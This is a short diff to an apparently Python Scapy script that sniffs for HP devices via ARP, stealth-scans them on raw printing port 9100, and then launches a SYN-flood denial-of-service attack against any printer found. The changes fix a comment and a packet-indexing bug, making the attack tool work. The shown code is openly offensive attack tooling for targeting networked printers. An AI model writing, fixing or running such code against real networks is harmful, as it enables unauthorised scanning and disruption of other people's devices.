@@ -11,7 +11,7 @@ def main():
 		printer_possible_ip = wait_for_connection_attempt()
 		#preferm stealth scan on port 9100 to see if this is a printer (9100 used for raw printing)
 		if preferm_stealth_scan(printer_possible_ip,RAW_PRINTING_PORT) == True:
-		##start dos attack (SYN Flooding Attack)
+		#start dos attack (SYN Flooding Attack)
 			dos_SYN_Flooding_Attack(printer_possible_ip)
 			
 			
@@ -21,7 +21,7 @@ def filter_HP_device(frame):
 def wait_for_connection_attempt():
 	frames = sniff(count = 1, lfilter = filter_HP_device)
 
-	return frames[ARP].psrc #ip address of the hp device
+	return frames[0][ARP].psrc #ip address of the hp device
 
 def preferm_stealth_scan(hp_device_ip,hp_device_port):
 	stealth_scan_hp = sr1(IP(dst=hp_device_ip)/TCP(dport=hp_device_port,flags='S'),timeout=10)
